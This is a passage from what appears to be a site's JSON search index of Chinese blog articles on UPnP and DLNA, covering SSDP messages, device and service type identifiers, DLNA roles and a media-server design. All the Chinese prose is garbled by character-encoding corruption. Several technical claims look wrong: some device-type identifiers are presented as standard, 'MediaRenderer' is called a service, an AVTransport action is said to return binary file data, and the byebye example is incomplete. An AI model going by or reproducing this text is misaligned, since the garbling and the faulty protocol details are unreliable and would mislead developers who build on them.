å,éœ€è¦è¿”å›ssdp:responseå“åº”æ¶ˆæ¯ã€‚ä¾‹å¦‚: HTTP/1.1 200 OK CACHE-CONTROL: max-age=1800 DATE: Fri, 15 Jun 2018 04:56:29 GMT EXT: LOCATION: http://192.168.1.20:5678/device.xml SERVER: Linux/3.14.0 UPnP/1.1 XXX-Device/1.0 ST: upnp:rootdevice USN: uuid:f40c2981-7329-40b7-8b04-27f187aecfb5 EXT: ç•™ä½œæ‰©å±•ä½¿ç”¨çš„å¤´éƒ¨ã€‚ç›®å‰æœªä½¿ç”¨ã€‚ ST: æœç´¢ç›®æ ‡(Search Target)å­—æ®µ,è¿”å›æœç´¢çš„è®¾å¤‡ç±»å‹ã€‚è¿™é‡Œæ˜¯upnp:rootdeviceè¡¨ç¤ºæ ¹è®¾å¤‡ã€‚ SERVER: æœåŠ¡å™¨å­—æ®µ,æä¾›å“åº”è®¾å¤‡çš„æ“ä½œç³»ç»Ÿã€UPnPåè®®ç‰ˆæœ¬å’Œè®¾å¤‡ä¿¡æ¯ã€‚æ ¼å¼ä¸ä¸¥æ ¼æŒ‡å®š,ç”±è®¾å¤‡å‚å•†è‡ªå®šä¹‰ã€‚ ssdp:byebyeé€€å‡ºæ¶ˆæ¯ å½“UPnPè®¾å¤‡ä»ç½‘ç»œç§»é™¤æ—¶,å®ƒéœ€è¦å‘é€ssdp:byebyeæ¶ˆæ¯ä»¥é€šçŸ¥ç½‘ç»œä¸Šçš„å…¶ä»–è®¾å¤‡: NOTIFY * HTTP/1.1 HOST: 239.255.255.250:1900 NT: upnp:rootdevice USN: uuid:device-UUID NOTIFYæ–¹æ³•è¡¨ç¤ºè¿™æ˜¯ä¸€æ¡é€šå‘Šæ¶ˆæ¯ æ”¶åˆ°æ­¤ssdp:byebyeæ¶ˆæ¯çš„å…¶ä»–è®¾å¤‡,å°†åˆ é™¤å¯¹åº”è®¾å¤‡ä¿¡æ¯,çŸ¥æ™“è¯¥è®¾å¤‡å·²ä¸å†å­˜åœ¨äºç½‘ç»œä¸­ã€‚ UPnPè®¾å¤‡éœ€è¦åœ¨ä»ç½‘ç»œæ–­å¼€æ—¶å‘é€ssdp:byebyeæ¶ˆæ¯,è€Œä¸èƒ½ä»…ä»…æ–­å¼€ç½‘ç»œè¿æ¥å°±ç¦»å¼€ã€‚ å¦åˆ™,å…¶ä»–è®¾å¤‡ä¼šä¸€ç›´è®¤ä¸ºå®ƒå­˜åœ¨,ç›´åˆ°å…¶ssdp:aliveæ¶ˆæ¯è¿‡æœŸã€‚ssdp:byebyeæ¶ˆæ¯èƒ½æ›´æ¸…æ™°çš„å‘ŠçŸ¥è®¾å¤‡çš„ç¦»å¼€,é¿å…å…¶ä»–è®¾å¤‡çš„é”™è¯¯è®¤çŸ¥ã€‚ æè¿° æ¯ä¸ª UPnP è®¾å¤‡éƒ½æœ‰ä¸€ä¸ª XML è®¾å¤‡æè¿°æ–‡ä»¶å’Œä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡æè¿°æ–‡ä»¶,æè¿°è®¾å¤‡å’ŒæœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚è¿™äº›æè¿°æ–‡ä»¶æ ¹æ® UPnP è®¾å¤‡æ¶æ„åˆ¶å®šã€‚ æ§åˆ¶ UPnP ä½¿ç”¨ç®€å•å¯¹è±¡è®¿é—®åè®®(SOAP)å®ç°è®¾å¤‡çš„è¿œç¨‹æ§åˆ¶å’ŒæŸ¥è¯¢ã€‚ äº‹ä»¶é€šçŸ¥ UPnP ä½¿ç”¨é€šç”¨äº‹ä»¶é€šçŸ¥æ¶æ„(GENA)ä½¿è®¾å¤‡èƒ½ä¸»åŠ¨é€šçŸ¥æ§åˆ¶ç‚¹å…¶å†…éƒ¨çŠ¶æ€çš„å˜åŒ–ã€‚","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Detailed-introduction.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Detailed-introduction.html"},{"title":"è®¾å¤‡/æœåŠ¡ç±»å‹","text":"UPnPå…·æœ‰çš„Serverç±»å‹ UPnP å®šä¹‰äº†å¤šç§è®¾å¤‡å’ŒæœåŠ¡ç±»å‹,å¯¹åº”ä¸åŒçš„åŠŸèƒ½å’Œç”¨é€”ã€‚å…¶ä¸­ UPnP è®¾å¤‡ç±»å‹ç”± UPnP è®ºå›å®šä¹‰å’Œç»´æŠ¤,å¸¸è§çš„æœ‰: 1. åª’ä½“æœåŠ¡å™¨(MediaServer) æä¾›æ•°å­—åª’ä½“å†…å®¹å­˜å‚¨å’Œæµå¼ä¼ è¾“åŠŸèƒ½,å¦‚éŸ³ä¹ã€è§†é¢‘å’Œå›¾ç‰‡ã€‚ä¾‹å¦‚ Windows Media Player å¯ä»¥å‘ç°è¿™ç±»è®¾å¤‡å¹¶æ’­æ”¾å…¶åª’ä½“ã€‚ 2. åª’ä½“æ¸²æŸ“å™¨(MediaRenderer) ç”¨äºæ¸²æŸ“æ•°å­—åª’ä½“å†…å®¹,å¦‚æ’­æ”¾éŸ³ä¹ã€è§†é¢‘å’Œæ˜¾ç¤ºå›¾ç‰‡ã€‚ä¾‹å¦‚ç½‘ç»œéŸ³å“ã€ç½‘ç»œç”µè§†å’Œæ•°å­—åª’ä½“æ’­æ”¾å™¨ã€‚ 3. ç½‘å…³è®¾å¤‡(InternetGatewayDevice) æä¾›è·¯ç”±å’Œäº’è”ç½‘è®¿é—®æœåŠ¡ã€‚å¤§å¤šæ•°å®¶ç”¨è·¯ç”±å™¨å®ç°æ­¤è®¾å¤‡ç±»å‹ã€‚ 4. æ‰“å°æœº(Printer) æä¾›æ‰“å°æœåŠ¡,å…è®¸ç½‘ç»œè®¡ç®—æœºå‘ç°å¹¶ä½¿ç”¨è¿æ¥çš„æ‰“å°æœºã€‚ 5. æ‰«æä»ª(Scanner) æä¾›æ‰«ææœåŠ¡,å…è®¸ç½‘ç»œè®¡ç®—æœºæ§åˆ¶æ‰«æä»ªæ‰«ææ–‡æ¡£ã€‚ 6. å¥åº·è®¾å¤‡(HealthDevice) æä¾›å¥åº·å’ŒåŒ»ç–—è®¾å¤‡ç›¸å…³çš„æœåŠ¡,ç”¨äºè¿œç¨‹ç›‘æ§ã€‚ 7. å®¶åº­è‡ªåŠ¨åŒ–(HomeAutomation) æä¾›å®¶å±…è‡ªåŠ¨åŒ–è®¾å¤‡æ§åˆ¶,å¦‚ç¯å…‰ã€ç”µè§†ç­‰ã€‚æ™ºèƒ½å®¶å±…äº§å“å¸¸å®ç°æ­¤ç±»å‹ã€‚ 8. å¹¿å‘Šè®¾å¤‡(Advertisement) æä¾›å¹¿å‘Šç›¸å…³çš„æœåŠ¡,å¯ä»¥å°†å¹¿å‘Šä¿¡æ¯æ¨é€åˆ°è®¢é˜…å®¢æˆ·ç«¯ã€‚ UPnP è®¾å¤‡ä¼šåœ¨è‡ªå·±çš„è®¾å¤‡æè¿°ä¸­å£°æ˜å…·ä½“å®ç°çš„è®¾å¤‡ç±»å‹,è¿™æ · UPnP æ§åˆ¶ç‚¹æ ¹æ®è®¾å¤‡ç±»å‹å°±å¯ä»¥åˆ¤æ–­è®¾å¤‡æä¾›çš„æœåŠ¡ç±»å‹å’ŒåŠŸèƒ½ã€‚ å…¶ä¸­åª’ä½“å’Œè·¯ç”±å™¨è®¾å¤‡å¯èƒ½æ˜¯æœ€å¸¸è§çš„ç±»å‹ã€‚ å…·ä½“çš„IDå®šä¹‰ åœ¨ UPnP ä¸­,æ¯ä¸ªè®¾å¤‡ç±»å‹éƒ½å¯¹åº”ä¸€ä¸ªæ ‡å‡†çš„ server type ç¼–å·,ä¹Ÿç§° UPnP Device Type IDsã€‚ è¿™äº›ç¼–å·ç”± UPnP è®ºå›å®šä¹‰å’Œç»´æŠ¤,ä»¥æ ‡è¯†ä¸åŒç±»å‹çš„ UPnP è®¾å¤‡ã€‚ å¸¸è§çš„å‡ ç§ UPnP è®¾å¤‡ç±»å‹åŠå…¶ server type ID å¦‚ä¸‹: åª’ä½“æœåŠ¡å™¨(MediaServer): urn:schemas-upnp-org:device:MediaServer:1 åª’ä½“æ¸²æŸ“å™¨(MediaRenderer): urn:schemas-upnp-org:device:MediaRenderer:1 è·¯ç”±å™¨(InternetGatewayDevice): urn:schemas-upnp-org:device:InternetGatewayDevice:1 æ‰“å°æœº(Printer): urn:schemas-upnp-org:device:Printer:1 æ‰«æä»ª(Scanner): urn:schemas-upnp-org:device:Scanner:1 å®¶åº­è‡ªåŠ¨åŒ–(HomeAutomation): urn:schemas-upnp-org:device:HomeAutomation:1 å¹¿å‘Šè®¾å¤‡(Advertisement): urn:schemas-upnp-org:device:Advertisement:1 ç­‰ç­‰,æ¯ä¸ªè®¾å¤‡ç±»å‹éƒ½æœ‰è‡ªå·±å”¯ä¸€çš„ server type ID è¿›è¡Œæ ‡è¯†ã€‚ UPnP è®¾å¤‡åœ¨å…¶è®¾å¤‡æè¿°ä¸­,é€šè¿‡åŒ…å«è‡ªå·±å¯¹åº”çš„æ ‡å‡† server type ID,æ¥å‘ŠçŸ¥æ§åˆ¶ç‚¹è‡ªå·±å…·ä½“å®ç°çš„æ˜¯å“ªç§è®¾å¤‡ç±»å‹ã€‚ ä¾‹å¦‚,å¦‚æœä¸€ä¸ª UPnP è®¾å¤‡çš„è®¾å¤‡æè¿°ä¸­åŒ…å«: <deviceType>urn:schemas-upnp-org:device:MediaServer:1</deviceType> åˆ™è¯¥è®¾å¤‡å®ç°çš„æ˜¯ UPnP åª’ä½“æœåŠ¡å™¨è®¾å¤‡ç±»å‹ã€‚ UPnP æ§åˆ¶ç‚¹å¯ä»¥é€šè¿‡è§£æè®¾å¤‡æè¿°,è·å–å…¶ä¸­çš„ deviceType ä¿¡æ¯,è¿›è€Œç¡®å®šè®¾å¤‡ç±»å‹å’Œæ”¯æŒçš„æœåŠ¡ã€‚ æ‰€ä»¥,UPnP Device Type ID å…è®¸åœ¨æ ‡å‡†çš„ UPnP æ¡†æ¶ä¸‹,å®šä¹‰å’Œè¯†åˆ«å„ç§æœåŠ¡å™¨è®¾å¤‡ç±»å‹,è¿™ä¸º UPnP è®¾å¤‡ä¹‹é—´çš„äº’æ“ä½œæ€§æä¾›äº†åŸºç¡€ã€‚ å¼€å‘ UPnP è®¾å¤‡æ—¶,éœ€è¦é€‰æ‹©ä¸€ä¸ªå·²æœ‰çš„æ ‡å‡†è®¾å¤‡ç±»å‹,æˆ–è€…å®šä¹‰ä¸€ä¸ªæ–°çš„è®¾å¤‡ç±»å‹(å¹¶ç”³è¯·ä¸€ä¸ªå”¯ä¸€ ID),ä»¥ä¾¿å…¶ä»– UPnP æ§åˆ¶ç‚¹èƒ½å¤Ÿæ­£ç¡®è¯†åˆ«è¯¥è®¾å¤‡ã€‚ UPnPå¸¸è§å‡ ç§æœåŠ¡ AVTransport Service ï¼ˆå¯æ§åˆ¶å¤šå±è®¾å¤‡ä¸Šçš„åª’ä½“ playï¼Œpauseï¼Œseekï¼Œstop ç­‰ï¼‰ RenderingControl Service ï¼ˆå¯è°ƒèŠ‚å¤šå±è®¾å¤‡ä¸Šçš„éŸ³é‡ï¼Œå£°éŸ³ï¼Œé™éŸ³ç­‰ï¼‰ ContentDirectory Service ï¼ˆå¯è·å–å¤šå±è®¾å¤‡ä¸Šå¯è®¿é—®çš„åª’ä½“å†…å®¹ï¼‰ ConnectionManager Service ï¼ˆå¯æä¾›æ‰€æ”¯æŒçš„ä¼ è¾“åè®®ä¿¡æ¯åŠå¤šå±è®¾å¤‡çš„ MIME æ ¼å¼ä¿¡æ¯ï¼‰ DLNA å„ç§è®¾å¤‡æœ¯è¯­ Digital Media Controllerï¼ˆDMCï¼‰æ•°ä½åª’ä½“æ§åˆ¶å™¨ï¼š ä½œä¸ºé¥æ§è£…ç½®ä½¿ç”¨ï¼Œå¯å¯»æ‰¾ DMS ä¸Šçš„å¤šåª’ä½“æ¡£æ¡ˆï¼Œ å¹¶æŒ‡å®šå¯æ’­æ”¾è¯¥å¤šåª’ä½“æ¡£æ¡ˆçš„ DMR è¿›è¡Œæ’­æ”¾æˆ–æ˜¯æ§åˆ¶å¤šåª’ä½“æ¡£æ¡ˆä¸Šä¸‹ä¼ åˆ° DMS çš„è£…ç½®ï¼Œä¸€èˆ¬æ˜¯æ‰‹æœºã€‚ Digital Media Serverï¼ˆDMSï¼‰æ•°ä½åª’ä½“æœåŠ¡å™¨ï¼š æä¾›äº†åª’ä½“æ¡£æ¡ˆçš„è·å–ã€å½•åˆ¶ã€å‚¨å­˜ä»¥åŠä½œä¸ºæºå¤´çš„è£…ç½®ã€‚ä¸€èˆ¬æ˜¯å…¬ç½‘ä¸Šæµåª’ä½“æœåŠ¡å™¨ Digital Media Rendererï¼ˆDMRï¼‰æ•°ä½åª’ä½“æ§åˆ¶å™¨ï¼š å¯æ¥æ”¶å¹¶æ’­æ”¾ä» DMC push è¿‡æ¥çš„åª’ä½“æ¡£æ¡ˆã€‚å³æ¥æ”¶æŠ•å±æ•°æ®ï¼Œä¸€èˆ¬æ˜¯æ™ºèƒ½ç”µè§†ï¼ŒOTT ç›’å­ç­‰ã€‚ è¿™ä¸‰è€…çš„å…³ç³»æ˜¯ï¼ŒDMC é€šè¿‡è·å– DMS ä¸Šçš„æ­Œæ›²æˆ–è€…è§†é¢‘ï¼ˆä¹Ÿå¯ä»¥ä¸æ˜¯ DMS ä¸Šçš„ï¼Œè€Œä»…ä»…åªæ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼ŒæŠŠå®ƒä»¬ä¼ é€åˆ° DMR ä¸Šï¼Œç”± DMR è¿›è¡Œæ’­æ”¾ã€‚","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Equipment-Â·-Service-Type.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Equipment-Â·-Service-Type.html"},{"title":"è‡ªå·±å®ç°DLNAåª’ä½“æœåŠ¡å™¨","text":"å®ç°ä¸€ä¸ªå®Œå¤‡çš„åª’ä½“æœåŠ¡å™¨, éœ€è¦çš„è®¾å¤‡æœåŠ¡åˆ†ç±» MediaServerè®¾å¤‡: æä¾›èµ„æºå‘ç°å’Œè®¿é—® å¿…é€‰æœåŠ¡:MediaServer , åª’ä½“æœåŠ¡å™¨æœåŠ¡, æä¾›åª’ä½“èµ„æºå‘ç°å’Œå…ƒæ•°æ®è®¿é—® å…¬å¼€æœåŠ¡å™¨ä¸Šçš„åª’ä½“èµ„æº,å®¢æˆ·ç«¯å¯ä»¥æµè§ˆå’Œæœç´¢èµ„æº å®¢æˆ·ç«¯é€‰æ‹©èµ„æºå,è·å–èµ„æºçš„è¯¦ç»†ä¿¡æ¯(å…ƒæ•°æ®)å’ŒæµURL å¿…é€‰æœåŠ¡:ContentDirectory , å†…å®¹ç›®å½•æœåŠ¡ - å°†å­˜å‚¨åœ¨UPnPåª’ä½“æœåŠ¡å™¨ä¸Šçš„èµ„æºä»¥æ ‘å½¢ç»“æ„ç»„ç»‡èµ·æ¥æ–¹ä¾¿æµè§ˆ - æ”¯æŒæ ¹æ®èµ„æºç±»å‹(å®¹å™¨ã€å¯¹è±¡)æˆ–å…ƒæ•°æ®å±æ€§å¯¹èµ„æºè¿›è¡Œè¿‡æ»¤å’Œæœç´¢ - å…è®¸æ§åˆ¶ç‚¹æ£€ç´¢å­˜å‚¨åœ¨æœåŠ¡ä¸­çš„èµ„æºçš„è¯¦ç»†ä¿¡æ¯ å¯é€‰æœåŠ¡:ConnectionManager, è¿æ¥ç®¡ç†å™¨æœåŠ¡, ç®¡ç†å¯¹æœåŠ¡å™¨çš„è¿æ¥,éªŒè¯å’Œæˆæƒå®¢æˆ·ç«¯ã€‚å¯é€‰æœåŠ¡. è‹¥æä¾›æ•æ„Ÿæ•°æ®æˆ–æœåŠ¡,éœ€è¦å¯¹è®¿é—®è¿›è¡Œæ§åˆ¶, æ¨èå®ç° MediaRendererè®¾å¤‡: è·å–æµæ’­æ”¾ å¿…é€‰æœåŠ¡:MediaRenderer,AVTransport å¯é€‰æœåŠ¡:ConnectionManager,MediaServer å…¶ä¸­: åª’ä½“æ¸²æŸ“å™¨æœåŠ¡(MediaRenderer):è·å–å’Œè§£ç æ’­æ”¾æµåª’ä½“ æ¥æ”¶å®¢æˆ·ç«¯æŒ‡å®šçš„æµURL,ä»URLä¸­è·å–åª’ä½“æµ è§£ç å¹¶æ’­æ”¾æ”¶åˆ°çš„åª’ä½“æµ,å®ç°è¿œç¨‹æµåª’ä½“æ’­æ”¾ AVä¼ è¾“æœåŠ¡(AVTransport):æ§åˆ¶MediaRendererçš„æ’­æ”¾ ç”¨äºæ§åˆ¶MediaRendererçš„æ’­æ”¾,å®ç°æ’­æ”¾æ§åˆ¶(æ’­æ”¾/æš‚åœ/åœæ­¢/Seekç­‰) å‘å¸ƒæ’­æ”¾çŠ¶æ€å’Œè¿›åº¦ç­‰,ä¾›å®¢æˆ·ç«¯ç›‘æ§ è¿æ¥ç®¡ç†å™¨æœåŠ¡(ConnectionManager):ç®¡ç†å¯¹æ¸²æŸ“å™¨çš„è¿æ¥,å¯é€‰æœåŠ¡ ç”¨äºç®¡ç†å®¢æˆ·ç«¯ä¸åª’ä½“æœåŠ¡å™¨/æ¸²æŸ“å™¨çš„è¿æ¥ éªŒè¯å®¢æˆ·ç«¯,æˆæƒæµè¿æ¥,å¹¶åœ¨è¿æ¥æ–­å¼€æ—¶æ¸…ç†èµ„æº æä¾›æµåª’ä½“æ’­æ”¾æœåŠ¡, è‹¥éœ€è¦å¯¹è¿æ¥å’Œ Play è¿›è¡Œæ§åˆ¶, åˆ™æ¨èå®ç° åª’ä½“æœåŠ¡å™¨æœåŠ¡(MediaServer):å¯é€‰æœåŠ¡,å¦‚æœMediaRendererä¹Ÿå­˜å‚¨èµ„æºå¯ä»¥å®ç°ã€‚ å¦‚æœä¸€ä¸ªè®¾å¤‡åŒæ—¶å…·å¤‡èµ„æºå­˜å‚¨+æµåª’ä½“æ’­æ”¾çš„åŠŸèƒ½,ä¹Ÿå¯ä»¥é€‰æ‹©åªå®ç°MediaRendererè®¾å¤‡, å¹¶åœ¨å…¶ä¸­åŒæ—¶åŒ…å«MediaServerä¸MediaRendereræœåŠ¡ã€‚ä½†è¿™éœ€è¦MediaRendereræ ‡å‡†èƒ½å¤Ÿæ»¡è¶³å¯¹åº”è¦æ±‚ å…·ä½“å¯ä»¥é€šè¿‡ä»¥ä¸‹è®¾å¤‡æè¿°å°†å…¶å®šä¹‰ä¸ºä¸€ä¸ªMediaServer+MediaRendererè®¾å¤‡: <root xmlns=\"urn:schemas-upnp-org:device-1-0\"> <specVersion> <major>1</major> <minor>0</minor> </specVersion> <device> <deviceType>urn:schemas-upnp-org:device:MediaServer:1</deviceType> <friendlyName>MY MEDIA SERVER</friendlyName> ... </device> <device> <deviceType>urn:schemas-upnp-org:device:MediaRenderer:1</deviceType> <friendlyName>MY MEDIA RENDERER</friendlyName> ... </device> </root> è¯¥æè¿°, å®šä¹‰äº†ä¸€ä¸ªå¸¦MediaServerå’ŒMediaRendererè®¾å¤‡ç±»å‹çš„UPnPè®¾å¤‡ã€‚ä»è€Œåœ¨ä¸€ä¸ªç‰©ç†è®¾å¤‡ä¸Šæä¾›å®Œæ•´çš„è¿œç¨‹åª’ä½“æµè§ˆã€æ’­æ”¾å’Œæ§åˆ¶åŠŸèƒ½ã€‚ æœ€å°åŒ–å­˜å‚¨åª’ä½“æœåŠ¡å™¨ ä»…å®ç°ä¸€ä¸ªå…·æœ‰å­˜å‚¨åŠŸèƒ½çš„è®¾å¤‡æœåŠ¡, ç±»ä¼¼äºçº¯æ–‡ä»¶æœåŠ¡å™¨, åª’ä½“æ’­æ”¾æ–¹é¢å¦‚è§£ç /ç¼–ç ç­‰ç”±å®¢æˆ·ç«¯è‡ªå·±å®ç°. å¯è¡Œæ–¹æ¡ˆ: ä½¿ç”¨è®¾å¤‡: MediaServer ContentDirectory:æä¾›æ–‡ä»¶å­˜å‚¨ç›®å½•å’Œæ–‡ä»¶å…ƒæ•°æ®çš„è®¿é—® ConnectionManager:ç®¡ç†å®¢æˆ·ç«¯è¿æ¥ è¿™æ—¶å€™å®¢æˆ·ç«¯éœ€è¦å®ç° MediaRenderer:è·å–æ–‡ä»¶æ•°æ®,è§£ç å¹¶æ’­æ”¾ AVTransport:è‡ªå·±å®ç°æ’­æ”¾æ§åˆ¶ ConnectionManager:ç®¡ç†è¿æ¥æœåŠ¡å™¨è·å–æ–‡ä»¶ å·¥ä½œæµç¨‹ä¸º: å®¢æˆ·ç«¯é€šè¿‡ContentDirectoryæµè§ˆæ–‡ä»¶æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶,è·å–æ–‡ä»¶å…ƒæ•°æ® å®¢æˆ·ç«¯é€‰æ‹©æ–‡ä»¶å,é€šè¿‡ConnectionManagerä¸æ–‡ä»¶æœåŠ¡å™¨å»ºç«‹è¿æ¥,è·å–æ–‡ä»¶æ•°æ® å®¢æˆ·ç«¯è‡ªèº«å…·å¤‡è§£ç å’Œæ’­æ”¾æ–‡ä»¶çš„èƒ½åŠ›,ä½¿ç”¨è‡ªå·±çš„MediaRendererå’ŒAVTransportå®ç°æ–‡ä»¶æ’­æ”¾ å®¢æˆ·ç«¯å¯ä»¥æ§åˆ¶è‡ªå·±çš„æ’­æ”¾,æ— éœ€ä¾èµ–æœåŠ¡å™¨ è¿™ç§æ–¹æ¡ˆçš„ä¼˜ç‚¹æ˜¯: æ–‡ä»¶æœåŠ¡å™¨å®ç°ç®€å•,åªéœ€æä¾›æ–‡ä»¶å­˜å‚¨å’Œè®¿é—® å®¢æˆ·ç«¯æœ‰æ›´å¤§çš„çµæ´»æ€§,å¯ä»¥é€‰æ‹©ä»»æ„çš„è§£ç å’Œæ’­æ”¾æ–¹æ¡ˆ å…¼å®¹æ€§å¥½,ä»»ä½•èƒ½å¤Ÿè·å–æ–‡ä»¶å¹¶æ’­æ”¾çš„å®¢æˆ·ç«¯éƒ½å¯ä»¥è®¿é—® ç¼ºç‚¹æ˜¯: å®¢æˆ·ç«¯éœ€è¦è‡ªè¡Œå®ç°è¾ƒå¤æ‚çš„æµåª’ä½“æ’­æ”¾åŠŸèƒ½ æ’­æ”¾ä½“éªŒä¾èµ–å®¢æˆ·ç«¯,æ— æ³•ç»Ÿä¸€ æ— æ³•åˆ©ç”¨UPnPç­‰æ ‡å‡†æ¥ç®€åŒ–å¼€å‘å’Œæé«˜äº’æ“ä½œæ€§ å¦‚æœæ–‡ä»¶æœåŠ¡å™¨åªæä¾›æ–‡ä»¶å­˜å‚¨åŠŸèƒ½,ä¾èµ–å®¢æˆ·ç«¯å®ç°æ’­æ”¾,è¿™ç§æ–¹æ¡ˆæ˜¯å¯è¡Œçš„,å¯ä»¥è·å¾—è¾ƒå¥½çš„å…¼å®¹æ€§å’Œçµæ´»æ€§ã€‚ ä½†å®¢æˆ·ç«¯å¼€å‘ä¼šè¾ƒä¸ºå¤æ‚,æ— æ³•åˆ©ç”¨UPnPç­‰æ ‡å‡†æ¥ç®€åŒ–æµç¨‹ã€‚ å¦‚æœæƒ³è¿›ä¸€æ­¥åˆ©ç”¨UPnPæ ‡å‡†,å¯ä»¥è€ƒè™‘æ–‡ä»¶æœåŠ¡å™¨å®ç°: è®¾å¤‡ç±»å‹:MediaServer+MediaRenderer å¯¹åº”æœåŠ¡: - ContentDirectory - ConnectionManager - MediaRenderer - AVTransport è¿™æ ·æ–‡ä»¶æœåŠ¡å™¨å¯ä»¥ç›´æ¥å¯¹è·å–çš„æ–‡ä»¶è§£ç å’Œæ’­æ”¾,å¹¶ä½¿ç”¨æ ‡å‡†çš„AVTransportå®ç°æ’­æ”¾æ§åˆ¶,è¿™å¯ä»¥æœ€å¤§é™åº¦ç®€åŒ–å®¢æˆ·ç«¯å¼€å‘,åˆ©ç”¨UPnPæ ‡å‡†æé«˜äº’æ“ä½œæ€§ã€‚åŒæ—¶ä¹Ÿæ§åˆ¶äº†æ’­æ”¾ä½“éªŒ,è¿™æ˜¯ä¸€ç§æ›´ä½³çš„å®ç°æ–¹æ¡ˆã€‚ ä½†æ˜¯è¿™æ ·å®¢æˆ·ç«¯åªèƒ½è¿›è¡Œé¡¹ç›®æµè§ˆ(çœ‹æœ‰å“ªäº›æ–‡ä»¶/æ–‡ä»¶å¤¹), ä¸èƒ½è®¿é—®å…·ä½“çš„åª’ä½“æ•°æ®(ä¸èƒ½åª’ä½“ä¼ è¾“æ’­æ”¾è§†é¢‘). è‹¥éœ€è¦æ”¯æŒæ•°æ®ä¼ è¾“, è¿˜éœ€è¦å®ç°: MediaRenderer æœåŠ¡, ä½¿ç”¨ä¸‹é¢çš„ GetMediaInfo actionæ¥è·å–åª’ä½“æ•°æ®. GetMediaInfo Actionçš„è¾“å…¥è¾“å‡ºå‚æ•°å¦‚ä¸‹: è¾“å…¥å‚æ•°: InstanceID: åª’ä½“å®ä¾‹ID,ç”±Browseç­‰Actionè¿”å› Filter: æŒ‡å®šè¿”å›çš„æ•°æ®ç±»å‹,å¦‚:\"*\"è¿”å›æ‰€æœ‰ä¿¡æ¯ è¾“å‡ºå‚æ•°: CurrentSrc: åª’ä½“URL,æŒ‡å‘å®é™…çš„åª’ä½“æ–‡ä»¶ MetaInfo: åª’ä½“å…ƒæ•°æ®ä¿¡æ¯ Data: å®é™…çš„åª’ä½“æ–‡ä»¶æ•°æ®,äºŒè¿›åˆ¶ å¯¹åº”çš„å‚æ•°ç±»å‹ä¸º: InstanceID: string Filter: string CurrentSrc: string,url MetaInfo: string,xml Data: bin.base64 å…¸å‹çš„è°ƒç”¨æµç¨‹ä¸º: å®¢æˆ·ç«¯è°ƒç”¨ContentDirectoryçš„BrowseActionè·å–è¦æ’­æ”¾çš„åª’ä½“InstanceID ä½¿ç”¨InstanceIDè°ƒç”¨GetMediaInfo Action,åŒæ—¶æŒ‡å®šFilterä¸º\"*\",è¡¨ç¤ºè¿”å›æ‰€æœ‰ä¿¡æ¯ æœåŠ¡å™¨è¿”å›CurrentSrc(åª’ä½“URL)ã€MetaInfo(å…ƒæ•°æ®)å’ŒData(æ–‡ä»¶æ•°æ®) å®¢æˆ·ç«¯è·å–Data,è°ƒç”¨ç³»ç»ŸAPIè¿›è¡Œè§£ç å’Œæ’­æ”¾ å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨Seek, Pauseç­‰Actionæ§åˆ¶æ’­æ”¾ å½“å®¢æˆ·ç«¯è¦ä¸»åŠ¨è·å–æœåŠ¡å™¨ä¸Šçš„åª’ä½“æ–‡ä»¶å¹¶è‡ªè¡Œæ’­æ”¾æ—¶,GetMediaInfoè¿™ä¸ªActionæ˜¯æœ€å…³é”®çš„ã€‚ å®ƒå¯ä»¥è¿”å›åª’ä½“çš„URL,å…ƒæ•°æ®å’Œæ–‡ä»¶æ•°æ®,è®©å®¢æˆ·ç«¯è·å¾—å…¨éƒ¨æ‰€éœ€ä¿¡æ¯è¿›è¡Œæ’­æ”¾ã€‚","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-media-server-by-yourself.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-media-server-by-yourself.html"},{"title":"è‡ªå·±å®ç°DLNAç›¸å…³","text":"å‰æ™¯ å»å¹´ä¹°äº†ä¸ªæŠ•å½±ä»ª, å¥ˆä½•æƒ³çœ‹é«˜åˆ†è¾¨ç‡è§†é¢‘è¿˜å¾—å¦å¤–å¼€ä¼šå‘˜, æœ€åˆæ˜¯ç½‘ä¸Šèµ„æºä¸‹è½½åˆ°ç¡¬ç›˜, ç„¶åç”¨æ¥ä¸¤ç§æ–¹å¼: åœ¨ç”µè„‘å¼€å¯sambaåè®®, æŠ•å½±ä»ªè®¿é—®sambaå…±äº«åº“ æŠŠç¡¬ç›˜æ’æŠ•å½±ä»ªæ’­æ”¾ å‰è€…å¯¹äºå¾ˆå¤§çš„è§†é¢‘è€Œè¨€, å¡; åè€…æ’ä¸ªå°å°¾å·´, å½±å“è§‚æ„Ÿ, ä¸”ä¸æ–¹ä¾¿. äºæ˜¯, å¤šæ–¹æŸ¥è¯¢åé€‰æ‹©äº†ä½¿ç”¨ DLNA åè®®æ¥è§£å†³(æŠ•å½±ä»ªæœ¬èº«ä¹Ÿæ”¯æŒ), åˆå› ä¸ºWindowsè‡ªå¸¦çš„å¾ˆåƒåœ¾, æ—¶èƒ½ç”¨, æ—¶ä¸èƒ½ç”¨, é‡è£…ç³»ç»Ÿåå¹²è„†å®Œå…¨ä¸èƒ½ç”¨äº†. å…ˆæå‰è§£é‡Šä¸€äº›æ¦‚å¿µ å¤šæ’­åœ°å€ å¤šæ’­åœ°å€å…è®¸åœ¨ UDP å±‚ä¸€æ¬¡æ€§å°†æ•°æ®åŒ…å‘é€ç»™å¤šå°ä¸»æœº,ä»»æ„ä¸»æœºéƒ½å¯ä»¥è‡ªåŠ¨åŠ å…¥å’Œç¦»å¼€å¤šæ’­ç»„,è¿™ä½¿å…¶éå¸¸é€‚åˆç”¨äºç‚¹å¯¹å¤šç‚¹çš„åº”ç”¨, å¦‚è§†é¢‘ä¼šè®®ã€æ¸¸æˆç­‰ã€‚ UPnP å°±é‡‡ç”¨æ ‡å‡†çš„å¤šæ’­åœ°å€ 239.255.255.250,å®ç°åœ¨å±€åŸŸç½‘ä¸­è®¾å¤‡æœåŠ¡çš„è‡ªåŠ¨å‘ç°,è¿™ä¹Ÿæ˜¯ 